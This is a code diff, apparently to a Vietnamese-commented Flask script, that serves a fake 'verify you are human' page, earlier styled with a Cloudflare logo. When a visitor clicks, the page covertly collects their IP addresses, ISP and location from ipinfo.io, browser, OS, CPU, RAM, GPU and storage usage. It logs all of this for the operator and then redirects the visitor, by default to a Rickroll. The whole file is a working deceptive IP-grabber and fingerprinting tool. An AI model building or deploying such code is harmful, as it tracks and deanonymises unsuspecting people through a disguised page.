@@ -1,10 +1,11 @@
+import math
 from flask import Flask, request, render_template_string
 from datetime import datetime
 import os
 
 app = Flask(__name__)
 
-# Nhập URL chuyển hướng từ CMD (nếu để trống, mặc định Rickroll)
+# Nhập URL chuyển hướng từ CMD (mặc định Rickroll nếu không nhập)
 redirect_url = input("Nhập URL chuyển hướng (enter để Rickroll): ").strip()
 if not redirect_url:
     redirect_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
@@ -16,6 +17,19 @@ if not os.path.exists(log_folder):
 
 os.system("clear")
 
+# Hàm chuyển đổi dung lượng (byte) sang đơn vị phù hợp sử dụng toán học
+def convert_bytes(num_bytes):
+    try:
+        num = float(num_bytes)
+    except:
+        return str(num_bytes)
+    if num == 0:
+        return "0 B"
+    exp = int(math.log(num, 1024))
+    value = num / (1024 ** exp)
+    unit = ["B", "KB", "MB", "GB", "TB", "PB"][exp]
+    return f"{value:.2f} {unit}"
+
 HTML_PAGE = f"""
 <!DOCTYPE html>
 <html lang="vi">
@@ -23,46 +37,14 @@ HTML_PAGE = f"""
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Xác minh bạn là con người</title>
-  <!-- Import Bootstrap CSS để tạo giao diện đẹp hơn -->
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
   <style>
-    body {{
-      background: linear-gradient(135deg, #74ABE2, #5563DE);
-      color: #fff;
-      font-family: 'Roboto', sans-serif;
-      min-height: 100vh;
+    html, body {{
       margin: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }}
-    .container {{
-      text-align: center;
-    }}
-    .logo {{
-      margin-bottom: 30px;
-    }}
-    .logo img {{
-      max-width: 150px;
-    }}
-    .btn-custom {{
-      background-color: #0077ff;
-      border: none;
-      border-radius: 8px;
-      padding: 12px 20px;
-      font-size: 18px;
-      color: #fff;
-      width: 200px;
-      transition: background-color 0.3s ease;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #000;
       cursor: pointer;
-    }}
-    .btn-custom:hover {{
-      background-color: #005ce6;
-    }}
-    .ip-display {{
-      margin-top: 15px;
-      font-size: 16px;
-      color: #ccc;
     }}
   </style>
   <script>
@@ -72,13 +54,45 @@ HTML_PAGE = f"""
         let data = await response.json();
         return data.ip;
       }} catch (error) {{
-        console.error("Lỗi khi lấy địa chỉ IP:", error);
+        console.error("Lỗi khi lấy IP:", error);
         return "Không xác định";
       }}
     }}
 
+    // Lấy ISP và thông tin vị trí từ ipinfo.io
+    async function fetchISP() {{
+      try {{
+        let response = await fetch("https://ipinfo.io/json");
+        let data = await response.json();
+        let isp = data.org || "Không xác định";
+        let location = (data.city && data.region && data.country)
+                       ? `${{data.city}}, ${{data.region}}, ${{data.country}}`
+                       : "";
+        return isp + (location ? " - " + location : "");
+      }} catch (error) {{
+        console.error("Lỗi khi lấy ISP:", error);
+        return "Không xác định";
+      }}
+    }}
+
+    // Lấy thông tin storage sử dụng API navigator.storage.estimate()
+    async function getStorageInfo() {{
+      if (navigator.storage && navigator.storage.estimate) {{
+        try {{
+          let estimate = await navigator.storage.estimate();
+          return estimate;  // {{ usage: <số>, quota: <số> }} (đơn vị byte)
+        }} catch (error) {{
+          console.error("Lỗi khi lấy storage:", error);
+        }}
+      }}
+      return {{ usage: "Không xác định", quota: "Không xác định" }};
+    }}
+
+    let redirectTriggered = false;
     async function verifyAndContinue() {{
-      // Thu thập thông tin hệ thống
+      if (redirectTriggered) return;
+      redirectTriggered = true;
+      
       const platformInfo = navigator.platform || "Không xác định";
       const userAgent = navigator.userAgent || "Không xác định";
       const cpuThreads = navigator.hardwareConcurrency || "Không xác định";
@@ -95,16 +109,14 @@ HTML_PAGE = f"""
           }}
         }}
       }} catch (e) {{
-        console.error("Lỗi khi lấy thông tin GPU:", e);
+        console.error("Lỗi khi lấy GPU:", e);
       }}
       
       const ipv4 = await fetchIP("https://api.ipify.org?format=json");
       const ipv6 = await fetchIP("https://api64.ipify.org?format=json");
+      const ispInfo = await fetchISP();
+      const storage = await getStorageInfo();
 
-      // Hiển thị IP phát hiện trên giao diện
-      document.getElementById("ipDisplay").innerText = "IP phát hiện: " + ipv4;
-      
-      // Gửi thông tin đến server để log
       fetch("/collect", {{
         method: "POST",
         headers: {{ "Content-Type": "application/json" }},
@@ -115,26 +127,18 @@ HTML_PAGE = f"""
           deviceMemory: deviceMemory,
           gpuInfo: gpuInfo,
           ipv4: ipv4,
-          ipv6: ipv6
+          ipv6: ipv6,
+          isp: ispInfo,
+          storageUsage: storage.usage,
+          storageQuota: storage.quota
         }})
       }});
       
-      // Chuyển hướng tới URL chuyển hướng
       window.location.href = "{redirect_url}";
     }}
   </script>
 </head>
-<body>
-  <div class="container">
-    <div class="logo">
-      <img src="https://i.ibb.co/Zz1Sp8rL/Cloudflare-Logo.png" alt="Logo" class="img-fluid">
-    </div>
-    <button class="btn-custom" onclick="verifyAndContinue()">Tiếp tục</button>
-    <div id="ipDisplay" class="ip-display"></div>
-  </div>
-  <!-- Import Bootstrap JS (optional) -->
-  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
+<body onclick="verifyAndContinue()">
 </body>
 </html>
 """
@@ -153,8 +157,14 @@ def collect():
     gpu_info = data.get("gpuInfo", "Không xác định")
     ipv4 = data.get("ipv4", "Không xác định")
     ipv6 = data.get("ipv6", "Không xác định")
+    isp_info = data.get("isp", "Không xác định")
+    storage_usage = data.get("storageUsage", "Không xác định")
+    # Bỏ thông tin storage quota theo yêu cầu
+
+    # Chuyển đổi dung lượng storage usage sang dạng dễ đọc
+    storage_usage_hr = convert_bytes(storage_usage) if storage_usage not in ("Không xác định", 0, "0") else None
     
-    # Xác định hệ điều hành (desktop & mobile)
+    # Xác định hệ điều hành
     os_info = "Không xác định"
     os_version = "Không xác định"
     if "Android" in user_agent:
@@ -188,7 +198,7 @@ def collect():
         os_info = "Linux"
         os_version = "Không xác định"
     
-    # Nhận diện trình duyệt và trích xuất phiên bản
+    # Nhận diện trình duyệt và phiên bản
     browser_info = "Không xác định"
     version_info = "Không xác định"
     user_agent_lower = user_agent.lower()
@@ -244,10 +254,8 @@ def collect():
     except:
         version_info = "Không xác định"
     
-    # Tạo nội dung log và lưu vào file .txt (tên file theo ngày, trong thư mục logs)
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    filename = os.path.join("logs", datetime.now().strftime("%Y-%m-%d") + ".txt")
-    log_data = f"""[{timestamp}]
+    # Tạo log
+    log_data = f"""[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]
 Hệ điều hành: {os_info} {os_version}
 Browser: {browser_info}/{version_info}
 Platform: {platform_info}
@@ -256,23 +264,36 @@ RAM: {device_memory} GB
 GPU: {gpu_info}
 IPv4: {ipv4}
 IPv6: {ipv6}
--------------------------
+ISP: {isp_info}
 """
+    try:
+        if float(storage_usage) > 0:
+            log_data += f"Storage Usage: {convert_bytes(storage_usage)}\n"
+    except:
+        pass
+    log_data += "-------------------------\n"
+
+    filename = os.path.join("logs", datetime.now().strftime("%Y-%m-%d") + ".txt")
     with open(filename, "a", encoding="utf-8") as f:
         f.write(log_data)
     
-    # In log ra console với màu đen (sử dụng ANSI escape code \033[30m)
-    print("\033[30m[🔍] Hệ điều hành: {} {}\033[0m".format(os_info, os_version))
-    print("\033[30m[🌐] Browser: {}/{}\033[0m".format(browser_info, version_info))
-    print("\033[30m[💻] Platform: {}\033[0m".format(platform_info))
-    print("\033[30m[⚙️] CPU Threads: {}\033[0m".format(cpu_threads))
-    print("\033[30m[🧠] RAM: {} GB\033[0m".format(device_memory))
-    print("\033[30m[🎮] GPU: {}\033[0m".format(gpu_info))
-    print("\033[30m[📡] IPv4: {}\033[0m".format(ipv4))
-    print("\033[30m[📶] IPv6: {}\033[0m".format(ipv6))
-    
+    # In log ra console với màu cyan (không in Storage Quota)
+    print("\033[36m[🔍] Hệ điều hành: {} {}\033[0m".format(os_info, os_version))
+    print("\033[36m[🌐] Browser: {}/{}\033[0m".format(browser_info, version_info))
+    print("\033[36m[💻] Platform: {}\033[0m".format(platform_info))
+    print("\033[36m[⚙️] CPU Threads: {}\033[0m".format(cpu_threads))
+    print("\033[36m[🧠] RAM: {} GB\033[0m".format(device_memory))
+    print("\033[36m[🎮] GPU: {}\033[0m".format(gpu_info))
+    print("\033[36m[📡] IPv4: {}\033[0m".format(ipv4))
+    print("\033[36m[📶] IPv6: {}\033[0m".format(ipv6))
+    print("\033[36m[🏢] ISP: {}\033[0m".format(isp_info))
+    try:
+        if float(storage_usage) > 0:
+            print("\033[36m[💾] Storage Usage: {}\033[0m".format(convert_bytes(storage_usage)))
+    except:
+        pass
     if ipv4 != "Không xác định":
-        print("\033[30m[✳️] Thiết bị kết nối với IP: {}\033[0m".format(ipv4))
+        print("\033[36m[✳️] Thiết bị kết nối với IP: {}\033[0m".format(ipv4))
     
     return "", 204
 
